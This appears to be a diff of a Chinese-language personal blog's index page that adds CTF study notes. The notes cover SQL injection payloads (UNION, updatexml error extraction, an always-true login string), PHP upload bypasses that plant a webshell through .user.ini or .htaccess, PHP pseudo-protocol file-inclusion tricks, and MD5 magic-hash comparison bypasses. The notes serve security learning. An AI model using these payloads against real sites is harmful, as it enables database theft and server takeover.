@@ -182,6 +182,400 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://garen-wang.cn/2021/08/31/SQL%E6%B3%A8%E5%85%A5%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Garen Wang">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Garen Wang's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/08/31/SQL%E6%B3%A8%E5%85%A5%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">SQL注入题型总结</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-08-31 15:48:10 / Modified: 17:24:49" itemprop="dateCreated datePublished" datetime="2021-08-31T15:48:10+08:00">2021-08-31</time>
+            </span>
+
+          
+            <span id="/2021/08/31/SQL%E6%B3%A8%E5%85%A5%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/" class="post-meta-item leancloud_visitors" data-flag-title="SQL注入题型总结" title="Views">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2021/08/31/SQL%E6%B3%A8%E5%85%A5%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/08/31/SQL%E6%B3%A8%E5%85%A5%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="SQL架构"><a href="#SQL架构" class="headerlink" title="SQL架构"></a>SQL架构</h2><p>我们可以认为SQL有四层，自顶向下为：数据库，数据库中所含的表，表中的列，列中储存的内容。</p>
+<p>一个数据库中有多个表，每一个表由若干行和列组成，列储存的是属性名称，而行储存的是内容。</p>
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><ul>
+<li><code>version()</code>在一些支持的数据库发行版下可以拿到相关版本号，对于搜索历代CVE拿来打很有用处。</li>
+<li><code>database()</code>获取当前在查询的数据库名称。</li>
+<li><code>information_schema</code>是一个在版本大于5.0后默认存在的数据库，在我们利用的时候提供了非常大的用处。</li>
+<li><code>group_concat</code>是一个把多个字符合成一个字符的方法，毕竟泄露的时候一般只能从一个字符的位置泄露出来。</li>
+</ul>
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol>
+<li><code>database()</code>获知当前数据库名称</li>
+<li><code>group_concat(table_name) from information_schema.tables where table_schema=database()</code>获取当前数据库中所有的表的名称</li>
+<li><code>group_concat(column_name) from information_schema.columns where table_name=&#39;your_table_name&#39;</code>获取一个表中所有列的名称</li>
+<li><code>group_concat(id, username, password) from your_table_name</code>获取<code>id, username, password</code>这些列中储存的值</li>
+</ol>
+<h2 id="经典万能密码"><a href="#经典万能密码" class="headerlink" title="经典万能密码"></a>经典万能密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; or &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
+<h2 id="常见过滤与绕过方法"><a href="#常见过滤与绕过方法" class="headerlink" title="常见过滤与绕过方法"></a>常见过滤与绕过方法</h2><ul>
+<li>空格过滤：套一个括号，如<code>select A from B</code>变成<code>select(A)from(B)</code></li>
+<li>双写绕过</li>
+</ul>
+<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><h3 id="union查询"><a href="#union查询" class="headerlink" title="union查询"></a><code>union</code>查询</h3><p>经常直接跟在输入的后面，就像这样：<code>password=1&#39; union select ... #</code></p>
+<p>就会产生<code>select password from table where password = &#39;1&#39; union select ... #&#39;</code></p>
+<p>最后的引号要用井号注释掉，这样才不会产生语法错误。</p>
+<p>另，<code>union</code>查询查询到并不存在的内容时，会创建出相应的内容出来，也就是写进了表中。</p>
+<h3 id="updatexml报错"><a href="#updatexml报错" class="headerlink" title="updatexml报错"></a><code>updatexml</code>报错</h3><p>原理是在<code>updatexml</code>使用过程中，第二个参数是元素的xpath，查找不到元素不但不会abort掉，还会把原本的经过解析过的参数通过报错信息输出出来。</p>
+<p><code>1&#39; or updatexml(1, concat(0x7e, (your_input), 0x7e), 1) #</code></p>
+<p>不过报错信息有点短，可以通过<code>left(str, 25)</code>和<code>right(str, 25)</code>的方法分别把左右两部分输出出来拿flag。</p>
+<p>相似的常用的截取函数有：</p>
+<ul>
+<li><code>mid(column_name, start[, length])</code>填入字段，规定从<code>start</code>处开始的<code>length</code>个字符读出来（这里的<code>start</code>下标从1开始）</li>
+<li><code>substr(str, start, length)</code>用法类似，下标也是从1开始</li>
+<li><code>left(str, n)</code>与<code>right(str, n)</code>，分别查看前n位和后n位</li>
+</ul>
+<p>此外出现诸如<code>flag</code>被绕过的情况，可以用<code>CHR()</code>来表示一个个字符再用加号concat起来就行了。与<code>CHR</code>对应的是<code>ORD</code>，跟python的名字一样。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://garen-wang.cn/2021/08/30/PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%A2%98%E5%9E%8B%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Garen Wang">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Garen Wang's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/08/30/PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%A2%98%E5%9E%8B%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">PHP文件上传题型记录</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-08-30 17:59:34" itemprop="dateCreated datePublished" datetime="2021-08-30T17:59:34+08:00">2021-08-30</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-09-06 19:34:27" itemprop="dateModified" datetime="2021-09-06T19:34:27+08:00">2021-09-06</time>
+              </span>
+
+          
+            <span id="/2021/08/30/PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%A2%98%E5%9E%8B%E8%AE%B0%E5%BD%95/" class="post-meta-item leancloud_visitors" data-flag-title="PHP文件上传题型记录" title="Views">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2021/08/30/PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%A2%98%E5%9E%8B%E8%AE%B0%E5%BD%95/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/08/30/PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%A2%98%E5%9E%8B%E8%AE%B0%E5%BD%95/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="常规思路"><a href="#常规思路" class="headerlink" title="常规思路"></a>常规思路</h2><p>常规思路是上传一句话木马上去，然后用中国蚁剑拿个webshell。</p>
+<p>直接传php文件传不了，就尝试其他也能执行php代码的格式，如：php3, php4, php5, phtml, pht等。</p>
+<p>如果都不行，就尝试上传图片木马，在开头添加一个GIF的magic number骗一下，同时POST过去的时候用bp抓个包，把filename改成php代码后缀。</p>
+<p>再不行可以尝试上传<code>.user.ini</code>，具体的做法如下：</p>
+<p>不抓包修改后缀名，把图片木马直接上传，这一步应该是正常的。</p>
+<p>然后再上传一个<code>.user.ini</code>文件，在里面写：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file&#x3D;image.gif</span><br></pre></td></tr></table></figure>
+<p>该文件上传后，在其所在目录访问任何php代码都会首先把<code>image.gif</code>里面的东西include进来，相当于将一句话木马通过文件包含的形式注入了。</p>
+<p>最后直接上中国蚁剑拿webshell，地址即是同目录下的任一个php文件（如果没有就再上传一个普通的php上去然后连） </p>
+<p>还有一种做法，提交<code>.htaccess</code>，内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php</span><br></pre></td></tr></table></figure><br>或者：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br></pre></td></tr></table></figure><br>前者把所有上传的东西都当做php文件执行，后者添加了<code>.jpg</code>结尾的文件可以当做php文件执行。</p>
+<p>之后跟<code>.user.ini</code>差不多，不需要抓包把后缀名改掉，直接上传jpg文件即可。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://garen-wang.cn/2021/08/30/Web-Protocols/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Garen Wang">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Garen Wang's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/08/30/Web-Protocols/" class="post-title-link" itemprop="url">Web Protocols</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-08-30 16:40:47 / Modified: 17:39:36" itemprop="dateCreated datePublished" datetime="2021-08-30T16:40:47+08:00">2021-08-30</time>
+            </span>
+
+          
+            <span id="/2021/08/30/Web-Protocols/" class="post-meta-item leancloud_visitors" data-flag-title="Web Protocols" title="Views">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2021/08/30/Web-Protocols/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/08/30/Web-Protocols/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="Common-Web-Protocols"><a href="#Common-Web-Protocols" class="headerlink" title="Common Web Protocols"></a>Common Web Protocols</h2><h3 id="HTTP-amp-HTTPS"><a href="#HTTP-amp-HTTPS" class="headerlink" title="HTTP &amp; HTTPS"></a>HTTP &amp; HTTPS</h3><p>HTTP与HTTPS就是在浏览器中访问互联网网页所用到的协议。</p>
+<p>HTTP就是应用最广泛的网络协议，数据在传输的过程中都是明文，所以运用HTTP协议来传输一些隐私数据就不安全。</p>
+<p>HTTPS可以理解为安全版的HTTP协议，核心是加入了SSL(Secure Sockets Layer)，通过SSL协议完成对所传输内容的加密。</p>
+<p>HTTP是无状态的，通过抓包修改包头通常能够实现身份的伪造，而HTTPS需要身份验证，相对更加安全。</p>
+<h3 id="FILE"><a href="#FILE" class="headerlink" title="FILE"></a>FILE</h3><p>FILE协议是用来访问本地文件的，可以访问文件夹。</p>
+<h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><p>FTP协议经常用在局域网中，通过该协议来进行文件的快速传输。</p>
+<h3 id="BLOB"><a href="#BLOB" class="headerlink" title="BLOB"></a>BLOB</h3><p>目前在一些在线视频音乐播放网页中，在审查html找src的时候经常能够看到以<code>blob::</code>开头的链接，粘贴进浏览器却没法访问。</p>
+<p>事实上blob协议的链接是一个本地创建的URL，通过这个只存在于本地的链接去访问视频音乐，并在使用结束后销毁掉该URL，这样能够减少相应文件被直接爬下来的情况出现。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = URL.createObjectURL(<span class="keyword">new</span> Blob([<span class="string">&quot;hello, world!&quot;</span>], &#123;<span class="attr">type</span>: <span class="string">&quot;text/plain&quot;</span>&#125;))</span><br><span class="line"><span class="comment">// *url* stores the blob link</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.URL.revokeObjectURL(url)</span><br><span class="line"><span class="comment">// now accessing the url causes 404 error code</span></span><br></pre></td></tr></table></figure>
+<h2 id="PHP-Pseudo-protocols"><a href="#PHP-Pseudo-protocols" class="headerlink" title="PHP Pseudo-protocols"></a>PHP Pseudo-protocols</h2><p>PHP的伪协议经常在文件包含的题目中运用到。</p>
+<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a><code>php://filter</code></h3><p>编码流，可以用来获取php代码。不过如果直接read进来的话会把代码执行掉，想要不执行代码的话一般通过base64加密通过输出拿到手后再解密来看。</p>
+<p>Example: <code>php://filter/read=convert.base64.encode/resource=useless.php</code></p>
+<h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a><code>php://input</code></h3><p>输入流，可以用来执行POST数据中的php代码。不过在<code>enctype=&quot;multipart/form-data</code>的时候这种方法会失效。</p>
+<h3 id="data"><a href="#data" class="headerlink" title="data://"></a><code>data://</code></h3><p>数据流，可以传入数据，支持MIME格式的解析。</p>
+<p>Example:</p>
+<ul>
+<li><code>data://text/plain,&lt;?php phpinfo()?&gt;</code>，可以执行php代码，但没有试过。</li>
+<li><code>data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code>，最终的结果会是这串加密内容解密后的内容，可用来绕过过滤。</li>
+</ul>
+<h3 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h3><ul>
+<li><code>phar://</code></li>
+<li><code>zlib://</code></li>
+<li><code>glob://</code></li>
+<li><code>rar://</code></li>
+<li><code>ogg://</code></li>
+<li><code>expect://</code></li>
+</ul>
+<p>这些没有见过，以后见到再补充吧。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://garen-wang.cn/2021/07/27/Concepts-about-Hyperledger-Fabric-v2-2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Garen Wang">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Garen Wang's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/07/27/Concepts-about-Hyperledger-Fabric-v2-2/" class="post-title-link" itemprop="url">Concepts about Hyperledger Fabric v2.2</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-07-27 20:35:33 / Modified: 21:00:28" itemprop="dateCreated datePublished" datetime="2021-07-27T20:35:33+08:00">2021-07-27</time>
+            </span>
+
+          
+            <span id="/2021/07/27/Concepts-about-Hyperledger-Fabric-v2-2/" class="post-meta-item leancloud_visitors" data-flag-title="Concepts about Hyperledger Fabric v2.2" title="Views">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2021/07/27/Concepts-about-Hyperledger-Fabric-v2-2/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/07/27/Concepts-about-Hyperledger-Fabric-v2-2/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://garen-wang.cn/2021/07/23/Hexo-Live2d-moc3-Configuration/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -596,7 +990,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-07-15 16:40:53" itemprop="dateModified" datetime="2021-07-15T16:40:53+08:00">2021-07-15</time>
+                <time title="Modified: 2021-09-21 09:17:12" itemprop="dateModified" datetime="2021-09-21T09:17:12+08:00">2021-09-21</time>
               </span>
 
           
@@ -643,91 +1037,19 @@
 <p>那么利用上面<code>&quot;0e123456&quot;==&quot;0e4456789&quot;</code>的性质，如果存在两个字符串，它们的前两位都恰好是<code>0e</code>，那么就成功绕过了这个分支。</p>
 <p>几个MD5值以<code>0e</code>开头的字符串：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br></pre></td></tr></table></figure>
+<p>MD5和双MD5都是0e开头的几个值：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CbDLytmyGm2xQyaLNhWn</span><br><span class="line">770hQgrBOjrcqftrlaZk</span><br><span class="line">7r4lGXCH2Ksu2JNT3BYM</span><br></pre></td></tr></table></figure>
+<p>md5前后都是0e开头的值：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0e215962017</span><br><span class="line">0eRnJWi9XnKd9Z7x</span><br></pre></td></tr></table></figure>
+<p>而如果想要达成这样的条件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$param1</span> !== <span class="variable">$param2</span> &amp;&amp; md5(<span class="variable">$param1</span>) === md5(<span class="variable">$param2</span>)) &#123;</span><br><span class="line">    <span class="comment">// then</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>则可以将<code>$param1</code>和<code>$param2</code>定义为含有不同元素的两个数组。由于<code>md5</code>函数传入数组会返回<code>null</code>，两个强类型条件都得到满足。</p>
 <h2 id="json绕过"><a href="#json绕过" class="headerlink" title="json绕过"></a>json绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="variable">$message</span> = json_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">    <span class="variable">$key</span> =<span class="string">&quot;*********&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$message</span>-&gt;key == <span class="variable">$key</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">...</span><br></pre></td></tr></table></figure>
 <p>虽然不知道<code>$key</code>的值，但是可以赌他不以数字开头，只要他不以数字开头，一旦发生弱类型的隐式转换，只要令<code>$message-&gt;key</code>为0就可以绕过了。</p>
 <h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
 <li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Mrsm1th/p/6745532.html">https://www.cnblogs.com/Mrsm1th/p/6745532.html</a></li>
 </ul>
 
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://garen-wang.cn/2021/07/11/Concepts-about-Hyperledger-Fabric/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="Garen Wang">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Garen Wang's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/07/11/Concepts-about-Hyperledger-Fabric/" class="post-title-link" itemprop="url">Concepts about Hyperledger Fabric</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2021-07-11 14:54:02 / Modified: 14:54:44" itemprop="dateCreated datePublished" datetime="2021-07-11T14:54:02+08:00">2021-07-11</time>
-            </span>
-
-          
-            <span id="/2021/07/11/Concepts-about-Hyperledger-Fabric/" class="post-meta-item leancloud_visitors" data-flag-title="Concepts about Hyperledger Fabric" title="Views">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">Views: </span>
-              <span class="leancloud-visitors-count"></span>
-            </span>
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine: </span>
-    
-    <a title="valine" href="/2021/07/11/Concepts-about-Hyperledger-Fabric/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2021/07/11/Concepts-about-Hyperledger-Fabric/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          
       
     </div>
 
@@ -984,444 +1306,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://garen-wang.cn/2021/03/27/First-Presentation-in-Kap0k/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="Garen Wang">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Garen Wang's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/03/27/First-Presentation-in-Kap0k/" class="post-title-link" itemprop="url">First Presentation in Kap0k</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2021-03-27 10:37:33" itemprop="dateCreated datePublished" datetime="2021-03-27T10:37:33+08:00">2021-03-27</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-04-06 20:17:24" itemprop="dateModified" datetime="2021-04-06T20:17:24+08:00">2021-04-06</time>
-              </span>
-
-          
-            <span id="/2021/03/27/First-Presentation-in-Kap0k/" class="post-meta-item leancloud_visitors" data-flag-title="First Presentation in Kap0k" title="Views">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">Views: </span>
-              <span class="leancloud-visitors-count"></span>
-            </span>
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine: </span>
-    
-    <a title="valine" href="/2021/03/27/First-Presentation-in-Kap0k/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2021/03/27/First-Presentation-in-Kap0k/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="RISC-V的分享"><a href="#RISC-V的分享" class="headerlink" title="RISC-V的分享"></a>RISC-V的分享</h1><p>讲一讲RISC-V的内容吧，最近跟着一个跟RISC-V有关的开源项目玩了一下，对RISC-V有最基本的了解，就分享一下吧。</p>
-<p>第一次做队内分享，讲的不对的话请大哥们指正。</p>
-<h2 id="RISC-V了解"><a href="#RISC-V了解" class="headerlink" title="RISC-V了解"></a>RISC-V了解</h2><p><del>在qemu编译的时候写一写，等啊等</del></p>
-<p>RISC-V作为PC端和嵌入式设备的新架构，不像x86那样有沉重的历史包袱，相比更加的精简与现代化。</p>
-<p>去年华为专场的那场CTF就有挺多RISC-V方面的pwn题，了解了不亏。</p>
-<p>RISC-V是大势所趋（逃</p>
-<p><a target="_blank" rel="noopener" href="https://metalcode.eu/2019-12-06-rv32i.html">RISC-V Cheat Sheet</a></p>
-<h3 id="RISC-V的寄存器"><a href="#RISC-V的寄存器" class="headerlink" title="RISC-V的寄存器"></a>RISC-V的寄存器</h3><img data-src="http://qiniu.garen-wang.cn/static/images/First-Presentation-in-Kap0k/riscv.png">
-<p>RISC-V的寄存器有32个，从<code>x0</code>到<code>x31</code>。根据官方的调用规范，各寄存器有以下的性质：</p>
-<ul>
-<li><p><code>zero(x0)</code>是特殊的寄存器，任何时候值都为0。</p>
-</li>
-<li><p><code>ra(x1)</code>储存返回地址，在函数调用过程中会时常变化。caller saved</p>
-</li>
